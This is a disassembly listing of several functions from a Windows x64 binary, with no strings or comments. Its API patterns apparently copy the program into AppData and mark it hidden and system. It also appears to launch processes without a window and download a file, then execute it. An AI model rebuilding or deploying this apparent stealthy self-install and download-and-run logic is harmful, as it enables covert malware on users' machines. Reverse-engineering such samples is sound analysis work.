   140003d46:	ff 15 c4 8a 01 00    	call   *0x18ac4(%rip)        # 0x14001c810
   140003d4c:	85 c0                	test   %eax,%eax
   140003d4e:	75 10                	jne    0x140003d60
   140003d50:	31 d2                	xor    %edx,%edx
   140003d52:	4c 89 f1             	mov    %r14,%rcx
   140003d55:	ff 15 dd 89 01 00    	call   *0x189dd(%rip)        # 0x14001c738
   140003d5b:	eb ac                	jmp    0x140003d09
   140003d5d:	0f 1f 00             	nopl   (%rax)
   140003d60:	4c 89 e9             	mov    %r13,%rcx
   140003d63:	e8 e8 ea 00 00       	call   0x140012850
   140003d68:	4c 89 ea             	mov    %r13,%rdx
   140003d6b:	4c 89 e1             	mov    %r12,%rcx
   140003d6e:	49 89 c0             	mov    %rax,%r8
   140003d71:	ff 15 a1 8a 01 00    	call   *0x18aa1(%rip)        # 0x14001c818
   140003d77:	85 c0                	test   %eax,%eax
   140003d79:	74 d5                	je     0x140003d50
   140003d7b:	eb 8c                	jmp    0x140003d09
   140003d7d:	0f 1f 00             	nopl   (%rax)
   140003d80:	41 57                	push   %r15
   140003d82:	41 56                	push   %r14
   140003d84:	41 55                	push   %r13
   140003d86:	41 54                	push   %r12
   140003d88:	55                   	push   %rbp
   140003d89:	57                   	push   %rdi
   140003d8a:	56                   	push   %rsi
   140003d8b:	53                   	push   %rbx
   140003d8c:	48 81 ec b8 05 00 00 	sub    $0x5b8,%rsp
   140003d93:	45 31 c9             	xor    %r9d,%r9d
   140003d96:	45 31 c0             	xor    %r8d,%r8d
   140003d99:	31 c9                	xor    %ecx,%ecx
   140003d9b:	ba 1a 00 00 00       	mov    $0x1a,%edx
   140003da0:	48 8d bc 24 70 04 00 	lea    0x470(%rsp),%rdi
   140003da7:	00 
   140003da8:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003dad:	ff 15 75 8b 01 00    	call   *0x18b75(%rip)        # 0x14001c928
   140003db3:	85 c0                	test   %eax,%eax
   140003db5:	0f 88 18 01 00 00    	js     0x140003ed3
   140003dbb:	48 8d 9c 24 40 01 00 	lea    0x140(%rsp),%rbx
   140003dc2:	00 
   140003dc3:	49 89 f9             	mov    %rdi,%r9
   140003dc6:	48 8b 2d 33 8a 01 00 	mov    0x18a33(%rip),%rbp        # 0x14001c800
   140003dcd:	ba 04 01 00 00       	mov    $0x104,%edx
   140003dd2:	4c 8d 64 24 30       	lea    0x30(%rsp),%r12
   140003dd7:	48 8d 05 c8 06 01 00 	lea    0x106c8(%rip),%rax        # 0x1400144a6
   140003dde:	4c 89 e1             	mov    %r12,%rcx
   140003de1:	4c 8d ac 24 60 03 00 	lea    0x360(%rsp),%r13
   140003de8:	00 
   140003de9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003dee:	4c 8d 05 ab 06 01 00 	lea    0x106ab(%rip),%r8        # 0x1400144a0
   140003df5:	ff d5                	call   *%rbp
   140003df7:	31 c9                	xor    %ecx,%ecx
   140003df9:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140003dff:	4c 89 ea             	mov    %r13,%rdx
   140003e02:	c6 84 24 33 01 00 00 	movb   $0x0,0x133(%rsp)
   140003e09:	00 
   140003e0a:	ff 15 68 88 01 00    	call   *0x18868(%rip)        # 0x14001c678
   140003e10:	48 89 d9             	mov    %rbx,%rcx
   140003e13:	4d 89 e1             	mov    %r12,%r9
   140003e16:	ba 04 01 00 00       	mov    $0x104,%edx
   140003e1b:	4c 8d 05 7d 07 01 00 	lea    0x1077d(%rip),%r8        # 0x14001459f
   140003e22:	ff d5                	call   *%rbp
   140003e24:	48 89 d9             	mov    %rbx,%rcx
   140003e27:	48 89 fa             	mov    %rdi,%rdx
   140003e2a:	ff 15 10 88 01 00    	call   *0x18810(%rip)        # 0x14001c640
   140003e30:	48 8d 9c 24 50 02 00 	lea    0x250(%rsp),%rbx
   140003e37:	00 
   140003e38:	4c 8b 3d e1 87 01 00 	mov    0x187e1(%rip),%r15        # 0x14001c620
   140003e3f:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140003e43:	48 89 c6             	mov    %rax,%rsi
   140003e46:	74 70                	je     0x140003eb8
   140003e48:	4c 8b 3d d1 87 01 00 	mov    0x187d1(%rip),%r15        # 0x14001c620
   140003e4f:	4c 8d b4 24 9c 04 00 	lea    0x49c(%rsp),%r14
   140003e56:	00 
   140003e57:	eb 17                	jmp    0x140003e70
   140003e59:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003e60:	48 89 fa             	mov    %rdi,%rdx
   140003e63:	48 89 f1             	mov    %rsi,%rcx
   140003e66:	ff 15 dc 87 01 00    	call   *0x187dc(%rip)        # 0x14001c648
   140003e6c:	85 c0                	test   %eax,%eax
   140003e6e:	74 3f                	je     0x140003eaf
   140003e70:	4d 89 e1             	mov    %r12,%r9
   140003e73:	ba 04 01 00 00       	mov    $0x104,%edx
   140003e78:	48 89 d9             	mov    %rbx,%rcx
   140003e7b:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140003e80:	4c 8d 05 19 06 01 00 	lea    0x10619(%rip),%r8        # 0x1400144a0
   140003e87:	ff d5                	call   *%rbp
   140003e89:	4c 89 ea             	mov    %r13,%rdx
   140003e8c:	48 89 d9             	mov    %rbx,%rcx
   140003e8f:	ff 15 7b 89 01 00    	call   *0x1897b(%rip)        # 0x14001c810
   140003e95:	85 c0                	test   %eax,%eax
   140003e97:	74 c7                	je     0x140003e60
   140003e99:	48 89 d9             	mov    %rbx,%rcx
   140003e9c:	41 ff d7             	call   *%r15
   140003e9f:	48 89 fa             	mov    %rdi,%rdx
   140003ea2:	48 89 f1             	mov    %rsi,%rcx
   140003ea5:	ff 15 9d 87 01 00    	call   *0x1879d(%rip)        # 0x14001c648
   140003eab:	85 c0                	test   %eax,%eax
   140003ead:	75 c1                	jne    0x140003e70
   140003eaf:	48 89 f1             	mov    %rsi,%rcx
   140003eb2:	ff 15 80 87 01 00    	call   *0x18780(%rip)        # 0x14001c638
   140003eb8:	48 89 d9             	mov    %rbx,%rcx
   140003ebb:	4d 89 e1             	mov    %r12,%r9
   140003ebe:	ba 04 01 00 00       	mov    $0x104,%edx
   140003ec3:	4c 8d 05 de 06 01 00 	lea    0x106de(%rip),%r8        # 0x1400145a8
   140003eca:	ff d5                	call   *%rbp
   140003ecc:	48 89 d9             	mov    %rbx,%rcx
   140003ecf:	41 ff d7             	call   *%r15
   140003ed2:	90                   	nop
   140003ed3:	48 81 c4 b8 05 00 00 	add    $0x5b8,%rsp
   140003eda:	5b                   	pop    %rbx
   140003edb:	5e                   	pop    %rsi
   140003edc:	5f                   	pop    %rdi
   140003edd:	5d                   	pop    %rbp
   140003ede:	41 5c                	pop    %r12
   140003ee0:	41 5d                	pop    %r13
   140003ee2:	41 5e                	pop    %r14
   140003ee4:	41 5f                	pop    %r15
   140003ee6:	c3                   	ret
   140003ee7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140003eee:	00 00 
   140003ef0:	41 56                	push   %r14
   140003ef2:	41 55                	push   %r13
   140003ef4:	41 54                	push   %r12
   140003ef6:	55                   	push   %rbp
   140003ef7:	57                   	push   %rdi
   140003ef8:	56                   	push   %rsi
   140003ef9:	53                   	push   %rbx
   140003efa:	48 81 ec 00 07 00 00 	sub    $0x700,%rsp
   140003f01:	31 c9                	xor    %ecx,%ecx
   140003f03:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140003f09:	48 8d 6c 24 70       	lea    0x70(%rsp),%rbp
   140003f0e:	48 8d 9c 24 b0 04 00 	lea    0x4b0(%rsp),%rbx
   140003f15:	00 
   140003f16:	48 89 ea             	mov    %rbp,%rdx
   140003f19:	ff 15 59 87 01 00    	call   *0x18759(%rip)        # 0x14001c678
   140003f1f:	45 31 c9             	xor    %r9d,%r9d
   140003f22:	45 31 c0             	xor    %r8d,%r8d
   140003f25:	31 c9                	xor    %ecx,%ecx
   140003f27:	48 8b 3d fa 89 01 00 	mov    0x189fa(%rip),%rdi        # 0x14001c928
   140003f2e:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140003f33:	ba 1a 00 00 00       	mov    $0x1a,%edx
   140003f38:	ff d7                	call   *%rdi
   140003f3a:	85 c0                	test   %eax,%eax
   140003f3c:	0f 88 ec 00 00 00    	js     0x14000402e
   140003f42:	4c 8d a4 24 80 01 00 	lea    0x180(%rsp),%r12
   140003f49:	00 
   140003f4a:	49 89 d9             	mov    %rbx,%r9
   140003f4d:	ba 04 01 00 00       	mov    $0x104,%edx
   140003f52:	48 8b 35 a7 88 01 00 	mov    0x188a7(%rip),%rsi        # 0x14001c800
   140003f59:	4c 8d 35 46 05 01 00 	lea    0x10546(%rip),%r14        # 0x1400144a6
   140003f60:	4c 89 e1             	mov    %r12,%rcx
   140003f63:	4c 8d 05 36 05 01 00 	lea    0x10536(%rip),%r8        # 0x1400144a0
   140003f6a:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140003f6f:	ff d6                	call   *%rsi
   140003f71:	45 31 c9             	xor    %r9d,%r9d
   140003f74:	45 31 c0             	xor    %r8d,%r8d
   140003f77:	31 c9                	xor    %ecx,%ecx
   140003f79:	c6 84 24 83 02 00 00 	movb   $0x0,0x283(%rsp)
   140003f80:	00 
   140003f81:	ba 1a 00 00 00       	mov    $0x1a,%edx
   140003f86:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140003f8b:	ff d7                	call   *%rdi
   140003f8d:	85 c0                	test   %eax,%eax
   140003f8f:	0f 88 99 00 00 00    	js     0x14000402e
   140003f95:	4c 8d ac 24 a0 03 00 	lea    0x3a0(%rsp),%r13
   140003f9c:	00 
   140003f9d:	49 89 d9             	mov    %rbx,%r9
   140003fa0:	ba 04 01 00 00       	mov    $0x104,%edx
   140003fa5:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140003faa:	4c 8d 05 ef 04 01 00 	lea    0x104ef(%rip),%r8        # 0x1400144a0
   140003fb1:	4c 89 e9             	mov    %r13,%rcx
   140003fb4:	ff d6                	call   *%rsi
   140003fb6:	48 8d bc 24 90 02 00 	lea    0x290(%rsp),%rdi
   140003fbd:	00 
   140003fbe:	4d 89 e9             	mov    %r13,%r9
   140003fc1:	ba 04 01 00 00       	mov    $0x104,%edx
   140003fc6:	48 8d 05 e7 04 01 00 	lea    0x104e7(%rip),%rax        # 0x1400144b4
   140003fcd:	48 89 f9             	mov    %rdi,%rcx
   140003fd0:	c6 84 24 a3 04 00 00 	movb   $0x0,0x4a3(%rsp)
   140003fd7:	00 
   140003fd8:	4c 8d 05 c1 04 01 00 	lea    0x104c1(%rip),%r8        # 0x1400144a0
   140003fdf:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003fe4:	ff d6                	call   *%rsi
   140003fe6:	c6 84 24 93 03 00 00 	movb   $0x0,0x393(%rsp)
   140003fed:	00 
   140003fee:	48 89 fa             	mov    %rdi,%rdx
   140003ff1:	48 89 e9             	mov    %rbp,%rcx
   140003ff4:	ff 15 16 88 01 00    	call   *0x18816(%rip)        # 0x14001c810
   140003ffa:	85 c0                	test   %eax,%eax
   140003ffc:	75 12                	jne    0x140004010
   140003ffe:	48 81 c4 00 07 00 00 	add    $0x700,%rsp
   140004005:	5b                   	pop    %rbx
   140004006:	5e                   	pop    %rsi
   140004007:	5f                   	pop    %rdi
   140004008:	5d                   	pop    %rbp
   140004009:	41 5c                	pop    %r12
   14000400b:	41 5d                	pop    %r13
   14000400d:	41 5e                	pop    %r14
   14000400f:	c3                   	ret
   140004010:	31 d2                	xor    %edx,%edx
   140004012:	4c 89 e1             	mov    %r12,%rcx
   140004015:	ff 15 d5 85 01 00    	call   *0x185d5(%rip)        # 0x14001c5f0
   14000401b:	45 31 c0             	xor    %r8d,%r8d
   14000401e:	48 89 fa             	mov    %rdi,%rdx
   140004021:	48 89 e9             	mov    %rbp,%rcx
   140004024:	ff 15 be 85 01 00    	call   *0x185be(%rip)        # 0x14001c5e8
   14000402a:	85 c0                	test   %eax,%eax
   14000402c:	75 0a                	jne    0x140004038
   14000402e:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004033:	eb c9                	jmp    0x140003ffe
   140004035:	0f 1f 00             	nopl   (%rax)
   140004038:	48 89 f9             	mov    %rdi,%rcx
   14000403b:	4c 8b 35 de 86 01 00 	mov    0x186de(%rip),%r14        # 0x14001c720
   140004042:	ba 06 00 00 00       	mov    $0x6,%edx
   140004047:	41 ff d6             	call   *%r14
   14000404a:	ba 02 00 00 00       	mov    $0x2,%edx
   14000404f:	4c 89 e1             	mov    %r12,%rcx
   140004052:	41 ff d6             	call   *%r14
   140004055:	4c 89 e1             	mov    %r12,%rcx
   140004058:	e8 23 f8 ff ff       	call   0x140003880
   14000405d:	49 89 f9             	mov    %rdi,%r9
   140004060:	ba 48 02 00 00       	mov    $0x248,%edx
   140004065:	48 89 d9             	mov    %rbx,%rcx
   140004068:	4c 8d 05 47 05 01 00 	lea    0x10547(%rip),%r8        # 0x1400145b6
   14000406f:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140004074:	ff d6                	call   *%rsi
   140004076:	48 8d 94 24 a4 03 00 	lea    0x3a4(%rsp),%rdx
   14000407d:	00 
   14000407e:	31 c0                	xor    %eax,%eax
   140004080:	45 31 c9             	xor    %r9d,%r9d
   140004083:	48 89 d7             	mov    %rdx,%rdi
   140004086:	45 31 c0             	xor    %r8d,%r8d
   140004089:	48 89 da             	mov    %rbx,%rdx
   14000408c:	48 c7 44 24 50 00 00 	movq   $0x0,0x50(%rsp)
   140004093:	00 00 
   140004095:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   14000409c:	00 00 
   14000409e:	b9 0c 00 00 00       	mov    $0xc,%ecx
   1400040a3:	f3 48 ab             	rep stos %rax,(%rdi)
   1400040a6:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1400040ab:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   1400040b2:	00 00 
   1400040b4:	c7 07 00 00 00 00    	movl   $0x0,(%rdi)
   1400040ba:	c7 84 24 a0 03 00 00 	movl   $0x68,0x3a0(%rsp)
   1400040c1:	68 00 00 00 
   1400040c5:	c7 84 24 dc 03 00 00 	movl   $0x1,0x3dc(%rsp)
   1400040cc:	01 00 00 00 
   1400040d0:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400040d5:	4c 89 6c 24 40       	mov    %r13,0x40(%rsp)
   1400040da:	4c 89 64 24 38       	mov    %r12,0x38(%rsp)
   1400040df:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   1400040e6:	00 00 
   1400040e8:	c7 44 24 28 00 00 00 	movl   $0x8000000,0x28(%rsp)
   1400040ef:	08 
   1400040f0:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   1400040f7:	00 
   1400040f8:	ff 15 0a 85 01 00    	call   *0x1850a(%rip)        # 0x14001c608
   1400040fe:	85 c0                	test   %eax,%eax
   140004100:	75 0e                	jne    0x140004110
   140004102:	b8 01 00 00 00       	mov    $0x1,%eax
   140004107:	e9 f2 fe ff ff       	jmp    0x140003ffe
   14000410c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004110:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140004115:	48 8b 1d c4 84 01 00 	mov    0x184c4(%rip),%rbx        # 0x14001c5e0
   14000411c:	ff d3                	call   *%rbx
   14000411e:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140004123:	ff d3                	call   *%rbx
   140004125:	eb db                	jmp    0x140004102
   140004127:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000412e:	00 00 
   140004130:	41 54                	push   %r12
   140004132:	55                   	push   %rbp
   140004133:	57                   	push   %rdi
   140004134:	56                   	push   %rsi
   140004135:	53                   	push   %rbx
   140004136:	48 81 ec c0 02 00 00 	sub    $0x2c0,%rsp
   14000413d:	48 85 c9             	test   %rcx,%rcx
   140004140:	48 89 cb             	mov    %rcx,%rbx
   140004143:	89 d5                	mov    %edx,%ebp
   140004145:	0f 84 25 01 00 00    	je     0x140004270
   14000414b:	e8 00 e7 00 00       	call   0x140012850
   140004150:	48 83 f8 07          	cmp    $0x7,%rax
   140004154:	0f 86 16 01 00 00    	jbe    0x140004270
   14000415a:	48 8d b4 24 a0 00 00 	lea    0xa0(%rsp),%rsi
   140004161:	00 
   140004162:	b9 04 01 00 00       	mov    $0x104,%ecx
   140004167:	4c 8d a4 24 b0 01 00 	lea    0x1b0(%rsp),%r12
   14000416e:	00 
   14000416f:	48 89 f2             	mov    %rsi,%rdx
   140004172:	ff 15 20 85 01 00    	call   *0x18520(%rip)        # 0x14001c698
   140004178:	ff 15 22 85 01 00    	call   *0x18522(%rip)        # 0x14001c6a0
   14000417e:	49 89 f1             	mov    %rsi,%r9
   140004181:	ba 04 01 00 00       	mov    $0x104,%edx
   140004186:	4c 89 e1             	mov    %r12,%rcx
   140004189:	4c 8d 05 45 04 01 00 	lea    0x10445(%rip),%r8        # 0x1400145d5
   140004190:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140004194:	ff 15 66 86 01 00    	call   *0x18666(%rip)        # 0x14001c800
   14000419a:	48 8d 0d 44 04 01 00 	lea    0x10444(%rip),%rcx        # 0x1400145e5
   1400041a1:	ff 15 39 85 01 00    	call   *0x18539(%rip)        # 0x14001c6e0
   1400041a7:	48 85 c0             	test   %rax,%rax
   1400041aa:	48 89 c6             	mov    %rax,%rsi
   1400041ad:	0f 84 bd 00 00 00    	je     0x140004270
   1400041b3:	48 8d 15 36 04 01 00 	lea    0x10436(%rip),%rdx        # 0x1400145f0
   1400041ba:	48 89 c1             	mov    %rax,%rcx
   1400041bd:	ff 15 bd 84 01 00    	call   *0x184bd(%rip)        # 0x14001c680
   1400041c3:	48 85 c0             	test   %rax,%rax
   1400041c6:	0f 84 ab 00 00 00    	je     0x140004277
   1400041cc:	45 31 c9             	xor    %r9d,%r9d
   1400041cf:	48 89 da             	mov    %rbx,%rdx
   1400041d2:	31 c9                	xor    %ecx,%ecx
   1400041d4:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400041db:	00 00 
   1400041dd:	4d 89 e0             	mov    %r12,%r8
   1400041e0:	ff d0                	call   *%rax
   1400041e2:	48 89 f1             	mov    %rsi,%rcx
   1400041e5:	89 c3                	mov    %eax,%ebx
   1400041e7:	ff 15 63 84 01 00    	call   *0x18463(%rip)        # 0x14001c650
   1400041ed:	85 db                	test   %ebx,%ebx
   1400041ef:	78 7f                	js     0x140004270
   1400041f1:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   1400041f6:	31 c0                	xor    %eax,%eax
   1400041f8:	b9 0d 00 00 00       	mov    $0xd,%ecx
   1400041fd:	48 89 d7             	mov    %rdx,%rdi
   140004200:	85 ed                	test   %ebp,%ebp
   140004202:	f3 48 ab             	rep stos %rax,(%rdi)
   140004205:	48 8b 05 34 36 01 00 	mov    0x13634(%rip),%rax        # 0x140017840
   14000420c:	48 8d 15 b7 03 01 00 	lea    0x103b7(%rip),%rdx        # 0x1400145ca
   140004213:	4c 89 64 24 48       	mov    %r12,0x48(%rsp)
   140004218:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000421d:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140004222:	48 8d 05 a7 03 01 00 	lea    0x103a7(%rip),%rax        # 0x1400145d0
   140004229:	48 0f 45 c2          	cmovne %rdx,%rax
   14000422d:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140004232:	ff 15 f8 86 01 00    	call   *0x186f8(%rip)        # 0x14001c930
   140004238:	85 c0                	test   %eax,%eax
   14000423a:	74 23                	je     0x14000425f
   14000423c:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   140004243:	00 
   140004244:	48 85 c9             	test   %rcx,%rcx
   140004247:	74 06                	je     0x14000424f
   140004249:	ff 15 91 83 01 00    	call   *0x18391(%rip)        # 0x14001c5e0
   14000424f:	31 c0                	xor    %eax,%eax
   140004251:	48 81 c4 c0 02 00 00 	add    $0x2c0,%rsp
   140004258:	5b                   	pop    %rbx
   140004259:	5e                   	pop    %rsi
   14000425a:	5f                   	pop    %rdi
   14000425b:	5d                   	pop    %rbp
   14000425c:	41 5c                	pop    %r12
   14000425e:	c3                   	ret
   14000425f:	4c 89 e1             	mov    %r12,%rcx
   140004262:	ff 15 b8 83 01 00    	call   *0x183b8(%rip)        # 0x14001c620
   140004268:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000426f:	00 
   140004270:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004275:	eb da                	jmp    0x140004251
   140004277:	48 89 f1             	mov    %rsi,%rcx
   14000427a:	ff 15 d0 83 01 00    	call   *0x183d0(%rip)        # 0x14001c650
   140004280:	eb ee                	jmp    0x140004270
   140004282:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140004289:	00 00 00 00 
   14000428d:	0f 1f 00             	nopl   (%rax)
   140004290:	41 55                	push   %r13
   140004292:	41 54                	push   %r12
   140004294:	55                   	push   %rbp
   140004295:	57                   	push   %rdi
   140004296:	56                   	push   %rsi
   140004297:	53                   	push   %rbx
   140004298:	48 81 ec e8 02 00 00 	sub    $0x2e8,%rsp
   14000429f:	4c 89 c3             	mov    %r8,%rbx
   1400042a2:	48 89 cf             	mov    %rcx,%rdi
   1400042a5:	89 d6                	mov    %edx,%esi
   1400042a7:	4c 8d ac 24 c0 00 00 	lea    0xc0(%rsp),%r13
   1400042ae:	00 
   1400042af:	45 89 cc             	mov    %r9d,%r12d
   1400042b2:	b9 04 01 00 00       	mov    $0x104,%ecx
   1400042b7:	4c 89 ea             	mov    %r13,%rdx
   1400042ba:	ff 15 d8 83 01 00    	call   *0x183d8(%rip)        # 0x14001c698
   1400042c0:	48 85 db             	test   %rbx,%rbx
   1400042c3:	74 09                	je     0x1400042ce
   1400042c5:	80 3b 00             	cmpb   $0x0,(%rbx)
   1400042c8:	0f 85 0a 01 00 00    	jne    0x1400043d8
   1400042ce:	ff 15 cc 83 01 00    	call   *0x183cc(%rip)        # 0x14001c6a0
   1400042d4:	48 8d ac 24 d0 01 00 	lea    0x1d0(%rsp),%rbp
   1400042db:	00 
   1400042dc:	4d 89 e9             	mov    %r13,%r9
   1400042df:	ba 04 01 00 00       	mov    $0x104,%edx
   1400042e4:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400042e8:	4c 8d 05 14 03 01 00 	lea    0x10314(%rip),%r8        # 0x140014603
   1400042ef:	48 89 e9             	mov    %rbp,%rcx
   1400042f2:	ff 15 08 85 01 00    	call   *0x18508(%rip)        # 0x14001c800
   1400042f8:	45 31 c9             	xor    %r9d,%r9d
   1400042fb:	45 31 c0             	xor    %r8d,%r8d
   1400042fe:	48 89 e9             	mov    %rbp,%rcx
   140004301:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140004308:	00 00 
   14000430a:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140004311:	00 
   140004312:	ba 00 00 00 40       	mov    $0x40000000,%edx
   140004317:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   14000431e:	00 
   14000431f:	ff 15 d3 82 01 00    	call   *0x182d3(%rip)        # 0x14001c5f8
   140004325:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140004329:	48 89 c3             	mov    %rax,%rbx
   14000432c:	0f 84 df 00 00 00    	je     0x140004411
   140004332:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   140004337:	41 89 f0             	mov    %esi,%r8d
   14000433a:	48 89 fa             	mov    %rdi,%rdx
   14000433d:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004344:	00 00 
   140004346:	48 89 c1             	mov    %rax,%rcx
   140004349:	ff 15 11 84 01 00    	call   *0x18411(%rip)        # 0x14001c760
   14000434f:	48 89 d9             	mov    %rbx,%rcx
   140004352:	48 8b 1d 87 82 01 00 	mov    0x18287(%rip),%rbx        # 0x14001c5e0
   140004359:	ff d3                	call   *%rbx
   14000435b:	39 74 24 4c          	cmp    %esi,0x4c(%rsp)
   14000435f:	0f 85 a3 00 00 00    	jne    0x140004408
   140004365:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   14000436a:	31 c0                	xor    %eax,%eax
   14000436c:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140004371:	48 89 d7             	mov    %rdx,%rdi
   140004374:	45 85 e4             	test   %r12d,%r12d
   140004377:	f3 48 ab             	rep stos %rax,(%rdi)
   14000437a:	48 8b 05 bf 34 01 00 	mov    0x134bf(%rip),%rax        # 0x140017840
   140004381:	48 8d 15 42 02 01 00 	lea    0x10242(%rip),%rdx        # 0x1400145ca
   140004388:	48 89 6c 24 68       	mov    %rbp,0x68(%rsp)
   14000438d:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004392:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140004397:	48 8d 05 32 02 01 00 	lea    0x10232(%rip),%rax        # 0x1400145d0
   14000439e:	48 0f 45 c2          	cmovne %rdx,%rax
   1400043a2:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400043a7:	ff 15 83 85 01 00    	call   *0x18583(%rip)        # 0x14001c930
   1400043ad:	85 c0                	test   %eax,%eax
   1400043af:	74 57                	je     0x140004408
   1400043b1:	48 8b 8c 24 b8 00 00 	mov    0xb8(%rsp),%rcx
   1400043b8:	00 
   1400043b9:	48 85 c9             	test   %rcx,%rcx
   1400043bc:	74 02                	je     0x1400043c0
   1400043be:	ff d3                	call   *%rbx
   1400043c0:	31 c0                	xor    %eax,%eax
   1400043c2:	48 81 c4 e8 02 00 00 	add    $0x2e8,%rsp
   1400043c9:	5b                   	pop    %rbx
   1400043ca:	5e                   	pop    %rsi
   1400043cb:	5f                   	pop    %rdi
   1400043cc:	5d                   	pop    %rbp
   1400043cd:	41 5c                	pop    %r12
   1400043cf:	41 5d                	pop    %r13
   1400043d1:	c3                   	ret
   1400043d2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400043d8:	48 8d ac 24 d0 01 00 	lea    0x1d0(%rsp),%rbp
   1400043df:	00 
   1400043e0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400043e5:	4d 89 e9             	mov    %r13,%r9
   1400043e8:	ba 04 01 00 00       	mov    $0x104,%edx
   1400043ed:	4c 8d 05 ac 00 01 00 	lea    0x100ac(%rip),%r8        # 0x1400144a0
   1400043f4:	48 89 e9             	mov    %rbp,%rcx
   1400043f7:	ff 15 03 84 01 00    	call   *0x18403(%rip)        # 0x14001c800
   1400043fd:	e9 f6 fe ff ff       	jmp    0x1400042f8
   140004402:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004408:	48 89 e9             	mov    %rbp,%rcx
   14000440b:	ff 15 0f 82 01 00    	call   *0x1820f(%rip)        # 0x14001c620
   140004411:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004416:	eb aa                	jmp    0x1400043c2
   140004418:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000441f:	00 
   140004420:	41 57                	push   %r15
   140004422:	41 56                	push   %r14
   140004424:	41 55                	push   %r13
   140004426:	41 54                	push   %r12
   140004428:	55                   	push   %rbp
   140004429:	57                   	push   %rdi
   14000442a:	56                   	push   %rsi
   14000442b:	53                   	push   %rbx
   14000442c:	48 81 ec 78 06 00 00 	sub    $0x678,%rsp
   140004433:	45 31 c9             	xor    %r9d,%r9d
   140004436:	45 31 c0             	xor    %r8d,%r8d
   140004439:	4c 8d a4 24 20 04 00 	lea    0x420(%rsp),%r12
   140004440:	00 
   140004441:	48 89 cf             	mov    %rcx,%rdi
   140004444:	89 d6                	mov    %edx,%esi
   140004446:	31 c9                	xor    %ecx,%ecx
   140004448:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   14000444d:	ba 1a 00 00 00       	mov    $0x1a,%edx
   140004452:	ff 15 d0 84 01 00    	call   *0x184d0(%rip)        # 0x14001c928
   140004458:	85 c0                	test   %eax,%eax
   14000445a:	0f 88 e6 00 00 00    	js     0x140004546
   140004460:	4c 8d ac 24 f0 00 00 	lea    0xf0(%rsp),%r13
   140004467:	00 
   140004468:	4d 89 e1             	mov    %r12,%r9
   14000446b:	4c 8b 35 8e 83 01 00 	mov    0x1838e(%rip),%r14        # 0x14001c800
   140004472:	ba 04 01 00 00       	mov    $0x104,%edx
   140004477:	48 8d 05 28 00 01 00 	lea    0x10028(%rip),%rax        # 0x1400144a6
   14000447e:	4c 89 e9             	mov    %r13,%rcx
   140004481:	4c 8d bc 24 10 03 00 	lea    0x310(%rsp),%r15
   140004488:	00 
   140004489:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000448e:	4c 8d 05 0b 00 01 00 	lea    0x1000b(%rip),%r8        # 0x1400144a0
   140004495:	41 ff d6             	call   *%r14
   140004498:	48 8d ac 24 00 02 00 	lea    0x200(%rsp),%rbp
   14000449f:	00 
   1400044a0:	31 c9                	xor    %ecx,%ecx
   1400044a2:	4c 89 fa             	mov    %r15,%rdx
   1400044a5:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400044ab:	c6 84 24 f3 01 00 00 	movb   $0x0,0x1f3(%rsp)
   1400044b2:	00 
   1400044b3:	ff 15 bf 81 01 00    	call   *0x181bf(%rip)        # 0x14001c678
   1400044b9:	ff 15 e1 81 01 00    	call   *0x181e1(%rip)        # 0x14001c6a0
   1400044bf:	4d 89 e9             	mov    %r13,%r9
